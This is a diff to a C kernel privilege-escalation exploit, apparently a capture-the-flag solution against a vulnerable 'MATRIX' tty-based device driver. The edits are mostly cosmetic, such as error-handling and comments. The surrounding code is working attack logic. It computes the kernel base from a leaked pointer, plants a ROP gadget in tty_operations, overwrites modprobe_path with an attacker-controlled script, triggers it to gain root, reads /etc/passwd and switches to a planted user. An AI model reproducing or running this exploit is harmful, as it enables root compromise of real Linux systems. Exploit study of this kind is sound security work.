@@ -20,6 +20,7 @@
 #include <string.h>
 #include <stdint.h>
 #include <stddef.h>
+#include <errno.h>
 #include "tty.h"
 #define PAGE_SIZE 0x1000
 #define logInfo(...) { \
@@ -34,6 +35,7 @@
 };
 #define errExit(...){ \
     logErr(__VA_ARGS__); \
+    fprintf(stderr,": %s",strerror(errno)); \
     exit(-1); \
 };
 
@@ -105,7 +107,6 @@ void writeMATRIX64(int devfd, uint64_t* todo, off64_t offset){
         ioctl(devfd,IOCTL_MATRIX_SET_POS,&write_pos);
     }
 }
-
 
 int main(int argc,char** argv,char** envp){
     int fd1 = openDEV();
@@ -200,12 +201,14 @@ int main(int argc,char** argv,char** envp){
     chunk_addr3 -= 0x38;
     logInfo("Chunk3 @ %p",(void *)chunk_addr3);
     uint64_t _text = ptm_unix98_ops - 0x82fb40;
-    uint64_t rop = _text+0x2dd74f; // xor eax,eax ; mov qword ptr [rdx], rcx ; ret
     uint64_t modprobe_path = _text + 0xa51ba0;
-    writeMATRIX64(fd4,&rop,offsetof(struct tty_operations,ioctl));
-
+    
     //rop
+    uint64_t rop = _text+0x2dd74f; // xor eax,eax ; mov qword ptr [rdx], rcx ; ret
+    writeMATRIX64(fd4,&rop,offsetof(struct tty_operations,ioctl));
     writeMATRIX64(fd1,&chunk_addr3,0x18);
+
+    //Change /sbin/modprobe to /home/user/vjp
     char* inject = "/home/user/vjp";
     for(uint64_t i = 0 ; i < strlen(inject)/4+1; ++i){
         ioctl(ptmx_fd,*(uint32_t *)(inject+4*i),modprobe_path+4*i);
@@ -222,6 +225,7 @@ int main(int argc,char** argv,char** envp){
     close(vjpfd);
     if(chmod("/home/user/vjp",0777))
         errExit("chmod");
+
     //Trigger call call_modprobe
     int magic = open("/home/user/pwn",O_CREAT | O_RDWR);
     if(magic < 0)
@@ -230,6 +234,8 @@ int main(int argc,char** argv,char** envp){
     close(magic);
     if(chmod("/home/user/pwn",0777))
         errExit("chmod");
+
+    //Root
     system("/home/user/pwn");
     system("cat /etc/passwd");
     system("su vjp");
